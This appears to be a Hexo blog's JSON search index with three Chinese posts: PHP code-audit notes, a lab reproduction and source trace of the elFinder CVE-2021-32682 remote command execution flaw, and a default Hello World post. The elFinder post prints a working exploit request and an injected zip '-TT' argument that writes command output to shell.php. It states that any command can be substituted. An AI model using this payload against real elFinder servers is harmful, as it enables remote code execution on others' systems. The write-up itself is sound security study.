[{"id":"7e3aab8248542e317877e2ea637498f0","title":"php 代码审计","content":"\n详述php代码审计这件事常见cms框架：\nthinkphp\nyii 2.0\nlaravel\nphp代码审计：\n1、cms的代码审计\n2、ctf题目中实战利用\n3、针对一些开源代码审计\n手段：\n1、代码审计工具\n2、代码审计点\n3、特殊函数以及魔法函数\n利用：\n1、xss点\n2、反序列化点、pop链\n3、一些文件上传绕过的点\n4、前台getshell 才是王道\n对个人的提高影响：\n1、学到一些通用的代码审计点\n2、学到一些php漏洞点\n3、启发自己代码能力\n4、增强自己攻击杀伤链深度\n资料收集：\nhttps://mp.weixin.qq.com/s/ccLnEeMRGzYexQf9hADB9g\nhttps://www.yuque.com/burpheart/phpaudit/php-shen-ji-ji-chu_cui-ruo-han-shu-su-cha-biao\nhttps://www.php.net/manual/zh/function.proc-open.php php中文手册\nhttps://www.anquanke.com/post/id/265092 狼组安全文库\n","slug":"php-代码审计","date":"2022-03-27T15:39:39.000Z","categories_index":"","tags_index":"代码审计","author_index":"神林"},{"id":"7ea883b6d4c638116488ccef6e5f43a4","title":"elfinder rce","content":"[CVE-2021-32682] elFinder ≤ 2.1.58 RCE 分析0x00漏洞点简介elfinder 是一款开源的web文件管理器，能够对文件进行操作，漏洞点在于zip压缩存档时没有对传入的name参数进行过滤，导致使用了linux 中 zip 命令参数进行命令执行。\n0x01环境搭建环境搭建直接使用p神的vulhub 直接进行搭建：\nsudo git clone https://github.com/vulhub/vulhub.git\n\ncd 到镜像目标文件所在地\n\nsudo docker-compose up -d\n\n环境启动成功/注意开启的端口/然后就可以进行复现了\n\n\n访问服务映射的端口：\n\n找到归档功能点（图中鼠标所在位置）：\n\n紧接着按照p神文档写的漏洞点进行复现：\n\n\n要注意两点：\n1、要在压缩了1之后进行发包，后面target的值必须是两个文件的hash\n2、腾讯云发包应该是被拦截了。这里我又在本地搭建的\n这个触发点还挺有意思的，之后会继续看一下其他利用方式。这里也是利用name参数过滤不足利用了zip -TT 参数实现cmd命令执行的。\n0x02漏洞跟踪分析漏洞源码：https://github.com/Studio-42/elFinder/releases/tag/2.1.58\n分析工具：Phpstorm\n根据之前漏洞复现捕获pcap数据包进行分析：\nGET &#x2F;php&#x2F;connector.minimal.php?cmd&#x3D;archive&amp;name&#x3D;-TvTT&#x3D;id%3Eshell.php%20%23%20a.zip&amp;target&#x3D;l1_Lw&amp;targets%5B1%5D&#x3D;l1_Mi56aXA&amp;targets%5B0%5D&#x3D;l1_MS50eHQ&amp;type&#x3D;application%2Fzip HTTP&#x2F;1.1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36\nAccept-Encoding: gzip, deflate\nAccept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01\nConnection: close\nHost: 43.128.18.191\nX-Requested-With: XMLHttpRequest\nReferer: http:&#x2F;&#x2F;43.128.18.191:8080&#x2F;\nAccept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7\n\n请求头中connector.minimal.php，get请求了cmd参数为archive，在源码中追踪一下此文件，搜索cmd未果。\n\n看一下是否存在include 或者 require 其他php文件：\n\n存在一个包含文件 autoload.php，内部全是包含调用的文件，并不能准确定位漏洞点，此时要么去猜测漏洞点文件位置，要么根据传入参数名称进行全局搜索确认，最后找到archive 自定义函数\n\n经过全局搜索寻找（偷偷看师傅们的漏洞分析），找到了archive 函数点：\n\n函数中调用了makeArchivers 自定义函数，进行跟进函数：\n\n函数代码如下所示：\n    protected function makeArchive($dir, $files, $name, $arc)\n    &#123;\n        if ($arc['cmd'] === 'phpfunction') &#123;\n            if (is_callable($arc['argc'])) &#123;\n                call_user_func_array($arc['argc'], array($dir, $files, $name));\n            &#125;\n        &#125; else &#123;\n            $cwd = getcwd();\n            if (chdir($dir)) &#123;\n                foreach ($files as $i => $file) &#123;\n                    $files[$i] = '.' . DIRECTORY_SEPARATOR . basename($file);\n                &#125;\n                $files = array_map('escapeshellarg', $files);\n\n                $cmd = $arc['cmd'] . ' ' . $arc['argc'] . ' ' . escapeshellarg($name) . ' ' . implode(' ', $files);\n                $err_out = '';\n                $this->procExec($cmd, $o, $c, $err_out, $dir);\n                chdir($cwd);\n            &#125; else &#123;\n                return false;\n            &#125;\n        &#125;\n        $path = $dir . DIRECTORY_SEPARATOR . $name;\n        return file_exists($path) ? $path : false;\n    &#125;\n\n分析发现这个函数就是我们传参进来并且进行执行的函数，内部首先对传入的name进行了字符串的处理，之后使procExec进行了执行，这里我们跟进一下procExec这个自己构造的函数，内部构造：\n\n函数内部存在proc_open 系统函数：\n\n这里proc_open 函数就是要利用的漏洞点，那我们返回来找一下最终name参数传参的一个过程，我们已知最终利用的就是procExec()，但是name并不是直接传入方法中，我们可以依据方法的调用来看一下最终是怎么进行传参，这是一个大致的函数调用流程，我们接下来从最终调用开始展开分析:\n\n首先来看elFinder.archive() 这个方法，这个方法对传入参数的name进行的存在判断，然后：\n\n接下来进入archive这个方法进行跟踪，这个方法代码跟多，我只截图name处理部分，有兴趣的可以自己跟踪分析：\n\n这里进行name字符串处理，可以看到进行了初步的字符替换然后进行拼接，最终使用uniqueName()这个函数进行了处理，我们继续跟进一下这个函数来分析这个字符串：\n\n\n处理完之后进入了remoteArchive()方法中：\n\n接着进入makeArchive()方法中进行处理：\n\n处理完成由procExec()方法进行执行，这里procExec()中调用了proc_open()这个php默认方法进行执行：\n\n字符串最终经过以下几个方法最终到达procExec()，通过proc_open() 来进行cmd 指令的操作，\nhttps:&#x2F;&#x2F;whimsical.com&#x2F;elfinder-poc-66xtTeo9wqUnNTmxEHuk3D@2Ux7TurymNRMFc1UUtu5\n这里我们看一下proc_open()方法的具体的作用：\nhttps://www.php.net/manual/zh/function.proc-open\n\n经过修改源码运行处理，可以获取其传入name &#x3D; 1.zip 在proc_open() 执行之前字符串为\n\"zip -r9 -q '1.zip' './a.zip'\"\n\n这里我们可以利用一下linux 中的zip 命令，zip命令详解如下：\n\n也就是说我们可以控制传入的name值来实现任意命令的执行，这里我们使用zip -TT 的参数来实现任意命令执行，我们可以构造：\n\"zip -r9 -q '-TvTT=\"$(id>shell.php)\".zip' './a.txt'\"\n\n可以将等号之后的内容换成你想执行的命令。\n0x03参考链接https://xz.aliyun.com/t/10739#toc-5\nhttps://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682\nhttps://websec.readthedocs.io/zh/latest/language/php/phar.html\n","slug":"elfinder-rce","date":"2022-03-25T15:45:38.000Z","categories_index":"","tags_index":"漏洞复现","author_index":"神林"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-03-24T14:18:50.422Z","categories_index":"","tags_index":"","author_index":"神林"}]